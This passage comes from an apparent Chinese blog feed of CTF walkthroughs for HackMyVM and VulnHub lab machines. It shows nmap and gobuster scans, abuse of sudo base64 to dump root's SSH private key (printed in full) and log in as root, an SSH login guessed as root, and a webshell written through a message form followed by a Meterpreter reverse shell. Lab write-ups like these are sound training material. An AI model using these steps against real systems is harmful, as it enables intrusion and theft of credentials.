class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><p>读取root下面的ssh私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">base64</span> /root/.ssh/id_rsa | <span class="hljs-built_in">base64</span> -d<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B<br>IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp<br>DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk<br>/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7<br>px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a<br>S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ<br>7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx<br>YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v<br>zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO<br>4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig<br>yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6<br>oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5<br>SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr<br>nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R<br>iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq<br>vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG<br>ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz<br>X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR<br>fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD<br>SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe<br>FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5<br>rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR<br>txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an<br>2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>使用root用户的ssh私钥进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">chmod</span> 600 <span class="hljs-built_in">id</span><br>lucas@baseme:~$ ssh root@127.0.0.1 -i <span class="hljs-built_in">id</span><br>The authenticity of host <span class="hljs-string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> cant be established.<br>ECDSA key fingerprint is SHA256:Hlyr217g0zTkGOpiqimkeklOhJ4kYRLtHyEh0IgMEbM.<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no)? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> (ECDSA) to the list of known hosts.<br>Linux baseme 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Mon Sep 28 12:47:13 2020 from 192.168.1.59<br>root@baseme:~# <br></code></pre></td></tr></table></figure><p> <strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@baseme:~# <span class="hljs-built_in">cat</span> root.txt <br>HMVFKBS64<br></code></pre></td></tr></table></figure><p>或者直接使用base64读取flag即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">base64</span> /root/root.txt | <span class="hljs-built_in">base64</span> -d<br>HMVFKBS64<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base64</tag>
      
      <tag>john</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gift</title>
    <link href="/hackmyvm/Gift/"/>
    <url>/hackmyvm/Gift/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://hackmyvm.eu/machines/machine.php?vm=Gift">https://hackmyvm.eu/machines/machine.php?vm=Gift</a></p><hr><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 10:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00045s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00073s latency).<br>MAC Address: 08:00:27:51:E4:3B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.00062s latency).<br>MAC Address: 08:00:27:08:75:F7 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.36</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.36<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 10:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:08:75:F7 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.89 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、端口详细信息扫描"><a href="#2、端口详细信息扫描" class="headerlink" title="2、端口详细信息扫描"></a>2、端口详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sT -sV -sC -O --min-rate 10000 -p22,80 192.168.2.36 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 10:33 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.00072s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)<br>|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:<span class="hljs-built_in">dd</span> (ECDSA)<br>|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Site doesnt have a title (text/html).<br>MAC Address: 08:00:27:08:75:F7 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.63 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、访问80端口"><a href="#1、访问80端口" class="headerlink" title="1、访问80端口"></a>1、访问80端口</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506231048518.png"><br>提示：<code>不深思。真的，很简单。</code></p><h2 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.36 -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.36<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,bak,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 57]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>未发现其他目录</p><h1 id="尝试SSH登录"><a href="#尝试SSH登录" class="headerlink" title="尝试SSH登录"></a>尝试SSH登录</h1><p>尝试使用<code>simple</code>作为登录凭据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh root@192.168.2.36   <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.36 (192.168.2.36)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.36<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">root@192.168.2.36&#x27;</span>s password: <br>IM AN SSH SERVER<br>gift:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialou<br></code></pre></td></tr></table></figure><p>成功进行<code>root</code>权限</p><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gift:~# <span class="hljs-built_in">cat</span> user.txt <br>HMV665sXzDS<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gift:~# <span class="hljs-built_in">cat</span> root.txt <br>HMVtyr543FG<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>hackmyvm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matrix-Breakout-2-Morpheus</title>
    <link href="/vulnhub/Matrix-Breakout-2-Morpheus/"/>
    <url>/vulnhub/Matrix-Breakout-2-Morpheus/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.1.0/24 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:33 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.1<br>Host is up (0.00012s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.2<br>Host is up (0.00023s latency).<br>MAC Address: 00:50:56:E8:96:F1 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00042s latency).<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.254<br>Host is up (0.0018s latency).<br>MAC Address: 00:50:56:EF:22:46 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.5<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 28.00 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.1.6 -oA nmapscan/ports           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:34 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.0029s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>81/tcp open  hosts2-ns<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.39 seconds<br></code></pre></td></tr></table></figure><ul><li>开放端口22,80和81<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80,81 192.168.1.6 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:35 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00076s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.51 ((Debian))<br>81/tcp open  http    nginx 1.18.0<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 - 5.5 (99%), Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (96%), Sony X75CH-series Android TV (Android 5.0) (95%), Linux 3.1 (95%), Linux 3.2 (95%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.03 seconds<br></code></pre></td></tr></table></figure></li><li>22端口是ssh服务，80端口是Apache服务，81端口是Nginx<br>（3）进行UDP扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80,81 192.168.1.6 -oA nmapscan/udp                          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00094s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>81/udp closed hosts2-ns<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.33 seconds<br></code></pre></td></tr></table></figure></li><li>端口没有开放UDP<br>（4）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,81 192.168.1.6 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:37 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00068s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /robots.txt: Robots file</span><br><span class="hljs-string">81/tcp open  hosts2-ns</span><br><span class="hljs-string">MAC Address: 00:0C:29:47:20:8B (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 44.30 seconds</span><br></code></pre></td></tr></table></figure></li><li>在80端口下，发现一个robot.txt文件</li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，是一个静态页面，提示了ssh的权限<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101541750.png"><br>（2）进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.1.6 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.1.6<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 276]<br>/index.html           (Status: 200) [Size: 348]<br>/.html                (Status: 403) [Size: 276]<br>/javascript           (Status: 301) [Size: 315] [--&gt; http://192.168.1.6/javascript/]<br>/robots.txt           (Status: 200) [Size: 47]<br>/graffiti.txt         (Status: 200) [Size: 139]<br>/graffiti.php         (Status: 200) [Size: 451]<br>/.php                 (Status: 403) [Size: 276]<br>/.html                (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 882236 / 882240 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（3）访问robot.txt，提示没有任何东西<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101554751.png"><br>（4）访问graffiti.txt，有相关的提示信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101556479.png"><br>（5）访问graffiti.php，找到一个留言框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101557085.png"></p><h2 id="web渗透-1"><a href="#web渗透-1" class="headerlink" title="web渗透"></a>web渗透</h2><p>（1）随便发送数据，进行尝试，发现提交后，会显示在当前页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101602020.png"><br>（2）查看数据包，发现提交的内容写入到了graffiti.txt文件中<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101612604.png"><br>（3）尝试写入一个webshell，另保存为一个php文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101616669.png"><br>（4）使用哥斯拉进行连接，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101623390.png"><br>（5）使用模块<code>PMeterpreter</code>进行稳定反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 